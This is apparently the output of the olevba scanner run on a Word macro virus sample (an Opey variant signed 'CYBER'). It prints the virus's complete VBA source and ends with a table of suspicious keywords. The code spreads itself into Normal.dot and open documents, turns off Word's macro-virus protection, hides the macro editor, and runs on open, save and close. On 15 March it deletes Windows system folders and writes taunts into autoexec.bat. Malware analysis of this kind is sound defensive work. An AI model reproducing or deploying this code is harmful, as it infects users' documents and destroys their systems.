olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-e7ab5a82a83082fd0acd0779da582b0c0fce2892
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-e7ab5a82a83082fd0acd0779da582b0c0fce2892 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cyberbug.bas 
in file: Virus.MSWord.Opey-based-e7ab5a82a83082fd0acd0779da582b0c0fce2892 - OLE stream: 'Macros/VBA/cyberbug'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Success As Boolean
Public Sub DelTree32(DrvLtr As String, DeleteDIR As String)
Dim Result As String
Dim W As Integer
Dim X As Integer
Dim Y As Integer
Dim Z As Integer
Dim DIRList() As String
Dim FileList() As String
W = 0
Y = 0
Success = False
On Error Resume Next
ChDrive DrvLtr
If Not Err = 0 Then Exit Sub
ChDir (DrvLtr & "\" & DeleteDIR)
If Not Err = 0 Then Exit Sub
ChDrive DrvLtr
RmDir ("\" & DeleteDIR)
If Err = 0 Then
    On Error GoTo 0
    Success = True
    Exit Sub
Else
    Result = Dir((DrvLtr & "\" & DeleteDIR & "\*.*"), vbDirectory)
    Do
    If (Result = "." Or Result = "..") = False Then
        Exit Do
    Else
        Result = Dir()
    End If
    Loop
    Do
    If Result = "" Then Exit Do
    If (GetAttr(DrvLtr & "\" & DeleteDIR & "\" & Result)) = vbDirectory Then
        W = W + 1
        ReDim Preserve DIRList(W)
        DIRList(W) = Result
    Else
        Y = Y + 1
        ReDim Preserve FileList(Y)
        FileList(Y) = Result
    End If
    Result = Dir()
    Loop
    For X = 1 To W
        Call DelTree32(DrvLtr, (DeleteDIR & "\" & DIRList(X)))
        If Success = False Then Exit Sub
    Next X
    For Z = 1 To Y
        Kill (DrvLtr & "\" & DeleteDIR & "\" & FileList(Z))
    Next Z
    ChDrive DrvLtr
    RmDir ("\" & DeleteDIR)
    Success = True
    On Error GoTo 0
End If
End Sub

Public Sub XCopy32(SourceDrv As String, SourceDIR As String, DestDrv As String, Optional DestDIR As String)
Dim Result As String
Dim W As Integer
Dim X As Integer
Dim Y As Integer
Dim Z As Integer
Dim DIRList() As String
Dim FileList() As String
W = 0
Y = 0
Success = False
On Error Resume Next
ChDrive SourceDrv
If Not Err = 0 Then Exit Sub
ChDir (SourceDrv & "\" & SourceDIR)
If Not Err = 0 Then Exit Sub
ChDrive DestDrv
If Not Err = 0 Then Exit Sub
ChDir (DestDrv & "\" & DestDIR)
If Not Err = 0 Then
    Err = 0
    MkDir (DestDrv & "\" & DestDIR)
    If Not Err = 0 Then Exit Sub
End If
On Error GoTo 0
Result = Dir((SourceDrv & "\" & SourceDIR & "\*.*"), vbDirectory)
Do
If (Result = "." Or Result = "..") = False Then
    Exit Do
Else
    Result = Dir()
End If
Loop
Do
If Result = "" Then Exit Do
If (GetAttr(SourceDrv & "\" & SourceDIR & "\" & Result)) = vbDirectory Then
    W = W + 1
    ReDim Preserve DIRList(W)
    DIRList(W) = Result
Else
    Y = Y + 1
    ReDim Preserve FileList(Y)
    FileList(Y) = Result
End If
Result = Dir()
Loop
For X = 1 To W
    Call XCopy32(SourceDrv, (SourceDIR & "\" & DIRList(X)), DestDrv, (DestDIR & "\" & DIRList(X)))
    If Success = False Then Exit Sub
Next X
For Z = 1 To Y
    FileCopy (SourceDrv & "\" & SourceDIR & "\" & FileList(Z)), (DestDrv & "\" & DestDIR & "\" & FileList(Z))
Next Z
Success = True
End Sub
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
        line2$ = "echo I think your system just crashed !!!!!"
            If (Month(Date) = 3) And (Day(Date) = 15) Then
                line1$ = "echo It's MICO's Birthday and he has a gift for you .."
                Call DelTree32("c:", "windows\system")
                Call DelTree32("c:", "windows\command")
                End If
                      
            If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo  hahahahahahaha !!!!!"
                        Print #hFile, line2$
                        Print #hFile, "echo from: CYBER"
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call cyberbug
    NTInfected = False
        For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "cyberbug" Then NTInfected = True
                If (clan <> "cyberbug") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next I
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "cyberbug" Then ODInfected = True
                    If (clan <> "cyberbug") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="cyberbug", Object:=wdOrganizerObjectProjectItems
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="cyberbug", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub cyberbug()
    On Error Resume Next
    Application.UserName = "CYBER"
    Application.UserAddress = "INTERNATIONAL GROUP OF HACKERS (IGH)"
    Application.UserInitials = "CYBERBUG"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "CYBER"
        .Title = "Document"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub Cyber()
Application.DisplayAlerts = wdAlertsNone
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub AutoExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

